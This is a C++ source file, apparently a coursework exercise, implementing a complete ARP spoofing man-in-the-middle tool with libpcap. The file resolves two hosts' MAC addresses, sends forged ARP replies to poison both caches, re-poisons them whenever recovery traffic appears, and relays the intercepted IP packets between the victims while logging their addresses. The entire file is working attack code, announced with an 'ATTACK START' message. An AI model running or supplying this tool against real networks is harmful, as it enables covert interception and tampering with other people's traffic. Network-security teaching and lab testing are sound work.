#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <signal.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

/* IP header */
struct sniff_ip {
    u_char ip_vhl;		/* version << 4 | header length >> 2 */
    u_char ip_tos;		/* type of service */
    u_short ip_len;		/* total length */
    u_short ip_id;		/* identification */
    u_short ip_off;		/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* don't fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
    u_char ip_ttl;		/* time to live */
    u_char ip_p;		/* protocol */
    u_short ip_sum;		/* checksum */
    struct in_addr ip_src,ip_dst; /* source and dest address */
};
#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

struct spoof_group{
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

/* Mac address string format length */
#define MAC_ADDR_FORMAT 18

/* Ip address string formath length */
#define IP_ADDR_FORMAT 16

bool send_relay(pcap_t* handle, u_char* packet, pcap_pkthdr* header, Mac my_mac, Mac target_mac)
{
    EthHdr* eth = (EthHdr*) packet;

    eth->dmac_ = target_mac;
    eth->smac_ = my_mac;

    pcap_sendpacket(handle, packet, header->len);
    std::cout << "[*] Send relay packet" << std::endl;
    return true;
}

/* Send arp packet */
bool send_arp_packet(pcap_t* handle, Mac smac, Ip sip, Mac tmac, Ip tip, uint16_t msgType)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = tmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(msgType);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(sip);
    if(tmac.isBroadcast()) packet.arp_.tmac_ = Mac::nullMac();
    else packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

// get my mac address(for linux)
Mac get_my_mac(const std::string& if_name){
    try{
        char mac_addr[MAC_ADDR_FORMAT];
        std::ifstream iface("/sys/class/net/" + if_name + "/address", std::ios_base::in);
        iface.getline(mac_addr, MAC_ADDR_FORMAT);
        iface.close();
        return Mac(mac_addr);
    }
    catch(int errno){
        std::cerr << "[!] MAC Address Error!" << strerror(errno);
        return Mac().nullMac();
    }
}

// get my ip address(for linux)
Ip get_my_ip(const std::string& if_name, int* err){
    char ip_addr[sizeof(sockaddr)] = {'0'};
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, if_name.c_str(), IFNAMSIZ);

    *err = ioctl(s, SIOCGIFADDR, &ifr);
    if (*err < 0) {
        return Ip();
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                  ip_addr, sizeof(sockaddr));
        return Ip(ip_addr);
    }
}

// get node's mac address
Mac get_node_mac(pcap_t* handle, Mac smac, Ip sip, Mac tmac, Ip tip){

    send_arp_packet(handle, smac, sip, tmac, tip, ArpHdr::Request);

    EthArpPacket* EthArp_header;
    pcap_pkthdr* header;
    const u_char* packet;
    while (true){
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return NULL;
        }
        EthArp_header = (EthArpPacket*)packet;
        if(EthArp_header->eth_.type_ == htons(EthHdr::Arp) &&
                EthArp_header->arp_.op_ == htons(ArpHdr::Reply) &&
                (uint32_t)EthArp_header->arp_.sip_ == htonl(tip)) break;
    }
    return EthArp_header->arp_.smac();
}

void doArpSpoofing(char* dev, pcap_t* handle, std::vector<spoof_group>& spoof_group_v){
    /* arp spoofing start */
    std::cout << "[*] ATTACK START" << std::endl;

    /* get my mac address */
    Mac myMac = get_my_mac(dev);
    std::cout << "[*] My Mac Address : " << (std::string)myMac << std::endl;

    /* get my ip address */
    int err;
    Ip myIp = get_my_ip(dev, &err);
    if(err < 0){
        std::cout << "[!] IP Address Error!" << std::endl;
        return;
    }
    std::cout << "[*] My IP Address : " << (std::string)myIp << std::endl;


    for(auto i = spoof_group_v.begin(); i != spoof_group_v.end(); i++){
        i->sender_mac = get_node_mac(handle, myMac, myIp, Mac::broadcastMac(), i->sender_ip);
        std::cout << "[*] Sender's Mac Address : " << (std::string)i->sender_mac << std::endl;
        i->target_mac = get_node_mac(handle, myMac, myIp, Mac::broadcastMac(), i->target_ip);
        std::cout << "[*] Target's Mac Address : " << (std::string)i->target_mac << std::endl;
    }
     std::cout << "[*] Send ARP packet for Spoofing ... " << std::endl;
     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
     for(auto i = spoof_group_v.begin(); i != spoof_group_v.end(); i++){
         send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
         send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
     }


     EthArpPacket* EthArp_header;
     while (true){
         pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             return;
         }
         EthArp_header = (EthArpPacket*)packet;
         if(EthArp_header->eth_.type_ == htons(EthHdr::Arp)){
             for(auto i = spoof_group_v.begin(); i != spoof_group_v.end(); i++){

                 if(EthArp_header->arp_.smac_ == myMac && EthArp_header->arp_.tmac_.isBroadcast()){
                     std::cout << "[*] Send ARP packet to Sender / Target ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == myMac && EthArp_header->arp_.tmac_.isNull()){
                     std::cout << "[*] Send ARP packet to Sender / Target ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->sender_mac &&
                         (uint32_t)EthArp_header->arp_.tip_ == htonl(i->target_ip)){
                     std::cout << "[*] Send ARP packet to Sender ... (Request)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->target_mac &&
                         (uint32_t)EthArp_header->arp_.tip_.isBroadcast()){
                     std::cout << "[*] Send ARP packet to Sender ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->target_mac && EthArp_header->arp_.tmac_.isNull()){
                     std::cout << "[*] Send ARP packet to Sender ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->target_mac && EthArp_header->arp_.tmac_.isBroadcast()){
                     std::cout << "[*] Send ARP packet to Sender ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->target_mac &&
                         (uint32_t)EthArp_header->arp_.tip_ == htonl(i->sender_ip)){
                     std::cout << "[*] Send ARP packet to Target ... (Request)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->sender_mac &&
                         (uint32_t)EthArp_header->arp_.tip_.isBroadcast()){
                     std::cout << "[*] Send ARP packet to Target ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->sender_mac && EthArp_header->arp_.tmac_.isNull()){
                     std::cout << "[*] Send ARP packet to Target ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                     continue;
                 }

                 if(EthArp_header->arp_.smac_ == i->sender_mac && EthArp_header->arp_.tmac_.isBroadcast()){
                     std::cout << "[*] Send ARP packet to Target ... (Broadcast)" << std::endl;
                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                     continue;
                 }
             }
         }
         else{
             for(auto i = spoof_group_v.begin(); i != spoof_group_v.end(); i++){
                 int offset = sizeof(EthHdr);
                 sniff_ip* ip_header = (sniff_ip*)(packet + offset);

                 if(EthArp_header->eth_.smac_ == i->sender_mac && EthArp_header->eth_.dmac_ == myMac){
                     std::cout<<"[*] packet captured smac: "<<(std::string)EthArp_header->eth_.smac_<<std::endl;
                     std::cout<<"[*] packet captured dmac: "<<(std::string)EthArp_header->eth_.dmac_<<std::endl;
                     std::cout<<"[*] packet captured sip: "<<inet_ntoa(ip_header->ip_src)<<std::endl;
                     std::cout<<"[*] packet captured dip: "<<inet_ntoa(ip_header->ip_dst)<<std::endl;
                     send_relay(handle, (u_int8_t*)packet, header, myMac, i->target_mac);
                     continue;
                 }
                 if(EthArp_header->eth_.smac_ == i->target_mac && EthArp_header->eth_.dmac_ == myMac){
                     std::cout<<"[*] packet captured smac: "<<(std::string)EthArp_header->eth_.smac_<<std::endl;
                     std::cout<<"[*] packet captured dmac: "<<(std::string)EthArp_header->eth_.dmac_<<std::endl;
                     std::cout<<"[*] packet captured sip: "<<inet_ntoa(ip_header->ip_src)<<std::endl;
                     std::cout<<"[*] packet captured dip: "<<inet_ntoa(ip_header->ip_dst)<<std::endl;
                     send_relay(handle, (u_int8_t*)packet, header, myMac, i->sender_mac);
                     continue;
                 }
             }
         }
     }
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    int spoof_group_num  = argc/2 - 1;
    std::vector<spoof_group> spoof_group_v;
    for(int i=0; i<spoof_group_num; i++){
        spoof_group_v.push_back({Ip(argv[2*i+2]), Ip(argv[2*i+3]), Mac(), Mac()});
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    doArpSpoofing(dev, handle, spoof_group_v);

    pcap_close(handle);
}
